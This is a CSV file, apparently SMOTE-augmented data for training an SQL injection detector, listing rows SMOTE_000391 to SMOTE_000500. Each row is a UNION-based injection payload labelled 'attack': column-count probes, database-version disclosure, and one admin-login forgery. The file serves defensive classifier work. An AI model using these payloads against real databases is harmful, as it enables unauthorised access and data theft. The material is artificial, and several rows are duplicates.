id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000391,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000415,0.6659515347427191
SMOTE_000392,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000272,0.24159437614210572
SMOTE_000393,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,0.25835896550360793
SMOTE_000394,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R000637,0.32792679506257555
SMOTE_000395,attack,union,"-1184""   )    )     )   union all select 1482--",nearest_attack_euclidean,R000232,0.20281289937179842
SMOTE_000396,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000346,0.6249062567445812
SMOTE_000397,attack,union,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",nearest_attack_euclidean,R001487,0.18271479618619207
SMOTE_000398,attack,union,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001035,0.39401364898056424
SMOTE_000399,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,0.3415923142188005
SMOTE_000400,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000040,0.013362683078588643
SMOTE_000401,attack,union,"-6870""  )   as deox where 8198  =  8198 union all select 8198#",nearest_attack_euclidean,R001498,0.6072885353580312
SMOTE_000402,attack,union,"1' where 3700  =  3700 union all select null,null,null--",nearest_attack_euclidean,R000718,0.35785806014898275
SMOTE_000403,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R001186,0.056199358465223725
SMOTE_000404,attack,union,"1%""  )   union all select null--",nearest_attack_euclidean,R000479,0.29067666457155406
SMOTE_000405,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R000414,0.2110621866441972
SMOTE_000406,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000729,0.6039879074486374
SMOTE_000407,attack,union,"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",nearest_attack_euclidean,R001008,0.30570848280811597
SMOTE_000408,attack,union,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000498,0.21172853858694238
SMOTE_000409,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000300,0.048668145071072075
SMOTE_000410,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R001440,0.049336848117394555
SMOTE_000411,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000015,0.02552840989875784
SMOTE_000412,attack,union,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",nearest_attack_euclidean,R001464,0.01854570146882578
SMOTE_000413,attack,union,"-8902 union all select 4339,4339,4339#",nearest_attack_euclidean,R000297,0.20401599522070166
SMOTE_000414,attack,union,"1%""  )   union all select null,null--",nearest_attack_euclidean,R001417,0.040339616038382625
SMOTE_000415,attack,union,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",nearest_attack_euclidean,R001354,0.1665019551189585
SMOTE_000416,attack,union,"1%'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001179,0.016709697438771477
SMOTE_000417,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R001178,0.28242608189232726
SMOTE_000418,attack,union,UNION ALL SELECT,nearest_attack_euclidean,R000082,0.7488485980365869
SMOTE_000419,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000454,0.1485156093887231
SMOTE_000420,attack,union,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001486,1.282621144360183
SMOTE_000421,attack,union,"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",nearest_attack_euclidean,R001041,0.31586880737441975
SMOTE_000422,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R001118,0.023751712741083935
SMOTE_000423,attack,union,"-6108'  )   union all select 2519,2519,2519,2519--",nearest_attack_euclidean,R000790,0.2659146449440107
SMOTE_000424,attack,union,"-1204'   )    )    union all select 3585,3585--",nearest_attack_euclidean,R001534,0.25467061387522655
SMOTE_000425,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R001123,0.22482544203291707
SMOTE_000426,attack,union,-3752%' union all select 9351--,nearest_attack_euclidean,R001122,0.1789004514631856
SMOTE_000427,attack,union,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",nearest_attack_euclidean,R000353,1.0638926690990183
SMOTE_000428,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000202,0.17544685033767984
SMOTE_000429,attack,union," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000170,0.18379701967264966
SMOTE_000430,attack,union,"1%' union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000328,0.07425882329416439
SMOTE_000431,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001420,0.37837513884797586
SMOTE_000432,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R001165,0.25237085509037827
SMOTE_000433,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000243,0.010041368145920899
SMOTE_000434,attack,union,"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",nearest_attack_euclidean,R000459,0.7551460416806294
SMOTE_000435,attack,union,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000853,0.3320691000753173
SMOTE_000436,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000217,0.16944191663243938
SMOTE_000437,attack,union,"1 where 4448  =  4448 union all select null,null,null,null,null#",nearest_attack_euclidean,R000751,0.10732285617160015
SMOTE_000438,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000478,0.005658898115287053
SMOTE_000439,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.18701417230930684
SMOTE_000440,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,1.6858739404357614e-07
SMOTE_000441,attack,union,"1%'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001395,0.6790337396447905
SMOTE_000442,attack,union,"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",nearest_attack_euclidean,R001548,0.06798896755540151
SMOTE_000443,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R001349,0.2511540825436356
SMOTE_000444,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000298,0.14783216013729414
SMOTE_000445,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,0.2618360721006461
SMOTE_000446,attack,union,-8513' union all select 7414--,nearest_attack_euclidean,R000309,0.014996454628958373
SMOTE_000447,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000105,0.7715997013893678
SMOTE_000448,attack,union," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000162,0.6115981212462724
SMOTE_000449,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001265,0.06107070972298135
SMOTE_000450,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000555,0.22530191865875177
SMOTE_000451,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000635,0.6173080337367551
SMOTE_000452,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000872,0.3128311139455049
SMOTE_000453,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.29083772403896874
SMOTE_000454,attack,union,"-3349   )    )     )   union all select 6553,6553#",nearest_attack_euclidean,R000246,0.11156335491864569
SMOTE_000455,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001332,0.10220041570583166
SMOTE_000456,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000513,0.3776264103658753
SMOTE_000457,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000311,0.14394814614688375
SMOTE_000458,attack,union,-4171'  )   union all select 6136#,nearest_attack_euclidean,R001347,0.1752802528488433
SMOTE_000459,attack,union,"-6492'  )   union all select 7204,7204--",nearest_attack_euclidean,R000602,0.19051774876656943
SMOTE_000460,attack,union,"1%'  )   union all select null,null--",nearest_attack_euclidean,R000711,0.15933954568133754
SMOTE_000461,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R001159,0.15657301793709746
SMOTE_000462,attack,union," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",nearest_attack_euclidean,R000061,0.07197058940675256
SMOTE_000463,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000902,0.028072560712426035
SMOTE_000464,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R001224,0.3067420556551476
SMOTE_000465,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000158,1.0837456064818907
SMOTE_000466,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.19267953169311966
SMOTE_000467,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000958,0.3067553500051913
SMOTE_000468,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001427,0.35131948471511304
SMOTE_000469,attack,union,"-5826""   )    )    union all select 7192,7192#",nearest_attack_euclidean,R000948,0.009202515876121323
SMOTE_000470,attack,union,"1 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000241,0.16404747643765585
SMOTE_000471,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R001147,0.7494228646889698
SMOTE_000472,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001044,0.26477051181522265
SMOTE_000473,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000478,0.06800705409700983
SMOTE_000474,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R000417,0.2308455656258724
SMOTE_000475,attack,union,"1 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001556,0.2184699667714071
SMOTE_000476,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001467,0.15886542812686663
SMOTE_000477,attack,union,"1""  )   where 3250  =  3250 union all select null#",nearest_attack_euclidean,R001193,0.6644983914389885
SMOTE_000478,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000613,0.37842295066344117
SMOTE_000479,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000939,0.4520975081589387
SMOTE_000480,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R001549,0.33444680068051874
SMOTE_000481,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000022,8.258325254949948
SMOTE_000482,attack,union,"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",nearest_attack_euclidean,R000949,1.3946977426728884e-05
SMOTE_000483,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000879,0.3468589519728669
SMOTE_000484,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R001458,0.2259739574877251
SMOTE_000485,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R001147,0.6108985419644803
SMOTE_000486,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R001165,0.36189286537920196
SMOTE_000487,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000043,0.07917703504231556
SMOTE_000488,attack,union,"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000494,0.40309530985521513
SMOTE_000489,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000161,0.16614102445292409
SMOTE_000490,attack,union,"-1573""  )   union all select 3928,3928,3928,3928--",nearest_attack_euclidean,R000647,0.3009604262938926
SMOTE_000491,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000661,0.17264426548313322
SMOTE_000492,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000330,0.22999351884385746
SMOTE_000493,attack,union," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.6466290384964555
SMOTE_000494,attack,union,"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000494,0.2818659600968802
SMOTE_000495,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.0
SMOTE_000496,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R001518,0.23807412648564769
SMOTE_000497,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000345,0.12882425203656245
SMOTE_000498,attack,union,"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",nearest_attack_euclidean,R001151,0.1909559210219801
SMOTE_000499,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000566,0.0841417172705063
SMOTE_000500,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R001130,0.043957914737546365
